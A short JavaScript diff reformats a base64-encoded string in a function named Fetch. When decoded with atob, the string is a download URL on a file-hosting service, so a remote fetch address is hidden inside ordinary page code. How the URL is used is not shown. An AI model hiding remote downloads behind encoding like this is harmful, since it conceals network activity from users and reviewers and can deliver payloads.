@@ -68,7 +68,14 @@ function createBackground() {
 }
 
 function Fetch() {
-    const aud = 'aHR0cHM6Ly93ZWIub3BlbmRyaXZlLmNvbS9hcGkvdjEvZG93bmxvYWQvZmlsZS5qc29uL05qRmZPRGt5TmpNd056ZGY/dGVtcF9rZXk9JUI2JTI3JTI0JThBeCUxQyU5NiU4NyUyNCVGMyVDRSUzQyVEQWp3JmlubGluZT0x'
+    const aud = (`
+        aHR0cHM6Ly93ZWIub3BlbmRyaXZl
+        LmNvbS9hcGkvdjEvZG93bmxvYWQv
+        ZmlsZS5qc29uL05qRmZPRGt5TmpN
+        d056ZGY/dGVtcF9rZXk9JUI2JTI3
+        JTI0JThBeCUxQyU5NiU4NyUyNCVG
+        MyVDRSUzQyVEQWp3JmlubGluZT0x
+    `)
     return atob(aud);
 }
 
